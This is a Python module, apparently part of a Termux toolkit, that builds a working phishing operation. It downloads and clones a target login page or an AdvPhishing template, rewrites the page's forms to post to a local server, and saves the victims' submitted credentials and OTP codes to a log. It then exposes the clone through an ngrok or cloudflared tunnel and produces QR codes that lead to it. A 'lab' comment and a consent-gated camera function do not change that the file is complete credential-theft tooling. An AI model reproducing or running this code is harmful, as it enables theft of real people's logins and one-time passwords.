#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Phishing de laboratório — adaptação Termux do AdvPhishing:
# servidor Python puro (sem PHP, sem apache, sem sudo/root).

import os
import re
import json
import threading
import urllib.request
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler

from core import utils

ROOT = utils.ROOT
PAGES = os.path.join(ROOT, "modules", "phishing", "pages")
ADVP = os.path.join(ROOT, "modules", "phishing", "AdvPhishing")

_handler_state = {"redirect": "/"}  # onde enviada a vítima após captura


class _Handler(SimpleHTTPRequestHandler):
    """Serve as páginas e captura POSTs (credenciais/OTP) para o log do lab."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=_handler_state["dir"], **kwargs)

    def do_POST(self):
        tamanho = int(self.headers.get("Content-Length", 0))
        corpo = self.rfile.read(tamanho).decode("utf-8", "replace")
        evento = {
            "data": datetime.now().isoformat(timespec="seconds"),
            "ip": self.client_address[0],
            "path": self.path,
            "post": corpo,
        }
        try:
            with open(os.path.join(utils.caminho("logs"), "phishing_captures.jsonl"), "a", encoding="utf-8") as f:
                f.write(json.dumps(evento, ensure_ascii=False) + "\n")
        except Exception:
            pass
        print(utils.c("\n  [CAPTURA] {}".format(corpo), utils.VERDE))
        try:
            self.send_response(302)
            self.send_header("Location", _handler_state["redirect"])
            self.end_headers()
        except Exception:
            pass

    def log_message(self, *args):
        """Silencia o log padrão do servidor."""
        pass


def _servir(diretorio, porta, redirect="/"):
    """Sobe o servidor HTTP em thread e bloqueia até Enter (parar)."""
    _handler_state["dir"] = diretorio
    _handler_state["redirect"] = redirect
    try:
        srv = HTTPServer(("", porta), _Handler)
    except OSError as e:
        print(utils.c("  Nao foi possivel abrir a porta {}: {}".format(porta, e), utils.VERMELHO))
        return
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(utils.c("  Servidor rodando em http://127.0.0.1:{}".format(porta), utils.VERDE))
    print("  Capturas sao salvas em logs/phishing_captures.jsonl")
    print(utils.c("  Use um tunel (modulo tunnel) para expor ao alvo do lab.", utils.AMARELO))
    try:
        input("  Enter para parar o servidor...")
    except EOFError:
        pass
    srv.shutdown()
    utils.log("phishing_server", "127.0.0.1", "servidor encerrado")


def _reescrever_formularios(html):
    """Aponta os <form> para o nosso endpoint de captura."""
    html = re.sub(r'action\s*=\s*["\'][^"\']*["\']', 'action="/"', html, flags=re.I)
    return html


def clone_page(alvo, ctx):
    """Clona uma página de login para servidor local e captura POSTs."""
    cfg = ctx["config"]
    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
    if utils.is_dry(ctx):
        utils.mostrar_dry("clone_page", "clonar {} e servir em :{}".format(alvo, porta))
        return
    print("  Baixando {}...".format(alvo))
    try:
        req = urllib.request.Request(alvo, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as r:
            html = r.read().decode("utf-8", "ignore")
    except Exception as e:
        print(utils.c("  Falha ao baixar: {}".format(e), utils.VERMELHO))
        return
    pasta = os.path.join(PAGES, "clone_{}".format(datetime.now().strftime("%Y%m%d_%H%M%S")))
    os.makedirs(pasta, exist_ok=True)
    html = _reescrever_formularios(html)
    with open(os.path.join(pasta, "index.html"), "w", encoding="utf-8") as f:
        f.write(html)
    print(utils.c("  Clone salvo em {}".format(pasta), utils.VERDE))
    utils.log("clone_page", alvo, "clone salvo: {}".format(pasta))
    _servir(pasta, porta)


def _advphishing_clone():
    """Clona o repositorio AdvPhishing (telas) se ainda nao existir."""
    destino = ADVP
    if os.path.isdir(destino):
        return True
    print(utils.c("  AdvPhishing nao encontrado localmente.", utils.AMARELO))
    if not utils.confirmar("  Clonar https://github.com/Ignitetch/AdvPhishing agora?", "s"):
        return False
    status = os.system('git clone --depth 1 https://github.com/Ignitetch/AdvPhishing.git "{}"'.format(destino))
    return status == 0


def templates(alvo, ctx):
    """Serve templates do AdvPhishing com servidor Python (adaptado ao Termux)."""
    cfg = ctx["config"]
    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
    if utils.is_dry(ctx):
        utils.mostrar_dry("templates", "listar/serve templates AdvPhishing em :{}".format(porta))
        return
    if not _advphishing_clone():
        print(utils.c("  Clone cancelado/falhou.", utils.VERMELHO))
        return
    # Procura as páginas (Webpages/<site>/*.html)
    opcoes = []
    for base, _dirs, arquivos in os.walk(os.path.join(ADVP, "Webpages")):
        for a in arquivos:
            if a.endswith(".html"):
                opcoes.append(os.path.join(base, a))
    if not opcoes:
        print(utils.c("  Nenhuma pagina encontrada no AdvPhishing.", utils.VERMELHO))
        return
    print(utils.c("\n  Templates disponiveis:", utils.VERDE))
    for i, caminho_op in enumerate(opcoes, 1):
        rel = os.path.relpath(caminho_op, ADVP)
        print("   [{:2d}] {}".format(i, rel))
    escolha = utils.perguntar("Numero do template", "1")
    try:
        escolha_idx = int(escolha) - 1
        alvo_html = opcoes[escolha_idx]
    except Exception:
        print(utils.c("  Opcao invalida.", utils.VERMELHO))
        return
    # Copia o template para a pasta de paginas com forms reescritos
    pasta = os.path.join(PAGES, "template_{}".format(datetime.now().strftime("%Y%m%d_%H%M%S")))
    os.makedirs(pasta, exist_ok=True)
    with open(alvo_html, encoding="utf-8", errors="ignore") as f:
        html = f.read()
    html = _reescrever_formularios(html)
    with open(os.path.join(pasta, "index.html"), "w", encoding="utf-8") as f:
        f.write(html)
    # Copia CSS/JS/img da pasta original
    origem_dir = os.path.dirname(alvo_html)
    for base, _dirs, arquivos in os.walk(origem_dir):
        for a in arquivos:
            if a.endswith(".html"):
                continue
            try:
                dados = open(os.path.join(base, a), "rb").read()
                destino_rel = os.path.relpath(base, origem_dir)
                destino_pasta = os.path.join(pasta, destino_rel) if destino_rel != "." else pasta
                os.makedirs(destino_pasta, exist_ok=True)
                with open(os.path.join(destino_pasta, a), "wb") as f2:
                    f2.write(dados)
            except Exception:
                pass
    print(utils.c("  Template copiado (sem PHP — captura feita pelo servidor Python).", utils.VERDE))
    utils.log("phishing_templates", origem_dir, "servido em {}".format(pasta))
    _servir(pasta, porta)


def tunnel(alvo, ctx):
    """Túnel público (ngrok ou cloudflared) para o clone local."""
    cfg = ctx["config"]
    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
    if utils.is_dry(ctx):
        utils.mostrar_dry("tunnel", "expor localhost:{} via ngrok/cloudflared".format(porta))
        return
    import subprocess
    if utils.ferramenta_existe("cloudflared"):
        print("  Iniciando cloudflared (Ctrl+C para parar)...")
        utils.log("tunnel", "localhost", "cloudflared :{}".format(porta))
        try:
            subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:{}".format(porta)])
        except KeyboardInterrupt:
            pass
        return
    if utils.ferramenta_existe("ngrok"):
        print("  Iniciando ngrok (Ctrl+C para parar)...")
        utils.log("tunnel", "localhost", "ngrok :{}".format(porta))
        try:
            subprocess.run(["ngrok", "http", str(porta)])
        except KeyboardInterrupt:
            pass
        return
    print(utils.c("  Nenhum tunel encontrado (ngrok/cloudflared).", utils.VERMELHO))
    if utils.confirmar("  Tentar instalar cloudflared?", "n"):
        if utils.instalar_ferramenta("cloudflared"):
            print("  Rode novamente o modulo tunnel.")
    else:
        print("  Instale manualmente: pkg install cloudflared / baixe ngrok.com")


def qr(alvo, ctx):
    """Gera QR Code para a URL do phishing (terminal ou PNG)."""
    url = alvo
    if not url:
        url = utils.perguntar("URL (ex.: https://xxxx.ngrok.io)", "http://127.0.0.1:8080")
    if utils.is_dry(ctx):
        utils.mostrar_dry("qr", "gerar QR de {}".format(url))
        return
    try:
        import qrcode
    except ImportError:
        print(utils.c("  qrcode nao instalado — pip install qrcode", utils.VERMELHO))
        return
    qr_obj = qrcode.QRCode(border=1, box_size=1)
    qr_obj.add_data(url)
    qr_obj.make(fit=True)
    try:
        qr_obj.print_ascii(invert=True)
    except Exception:
        pass
    try:
        os.makedirs(PAGES, exist_ok=True)
        img = qr_obj.make_image(fill_color="black", back_color="white")
        destino = os.path.join(PAGES, "qr.png")
        img.save(destino)
        print(utils.c("  PNG salvo em {}".format(destino), utils.VERDE))
    except Exception as e:
        print(utils.c("  PNG indisponivel (Pillow): {}".format(e), utils.AMARELO))
    utils.log("qr_phish", url, "QR gerado")


def camera_sim(ctx_alvo, ctx):
    """Captura de câmera — SIMULAÇÃO com consentimento duplo (Termux:API)."""
    print(utils.c("  Este modulo requer CONSENTIMENTO EXPLICITO da pessoa filmada.", utils.AMARELO))
    print("  Sem Termux:API instalada, apenas simulamos o fluxo.")
    if not utils.confirmar("  A pessoa filmada consentiu com a captura?", "n"):
        print(utils.c("  Sem consentimento — cancelado.", utils.VERMELHO))
        return
    if not utils.confirmar("  Confirmar captura (2a confirmacao)?", "n"):
        print(utils.c("  Cancelado.", utils.VERMELHO))
        return
    if utils.is_dry(ctx):
        utils.mostrar_dry("camera_sim", "termux-camera-photo")
        return
    if utils.ferramenta_existe("termux-camera-photo"):
        destino = os.path.join(utils.caminho("logs"), "camera_foto.jpg")
        status = os.system("termux-camera-photo {}".format(destino))
        if status == 0:
            print(utils.c("  Foto salva em {}".format(destino), utils.VERDE))
        utils.log("camera_sim", "local", "termux-camera-photo status={}".format(status))
    else:
        print(utils.c("  SIMULACAO: instale 'pkg install termux-api' e o app Termux:API.", utils.AMARELO))
        utils.log("camera_sim", "local", "simulado (sem termux-api)")
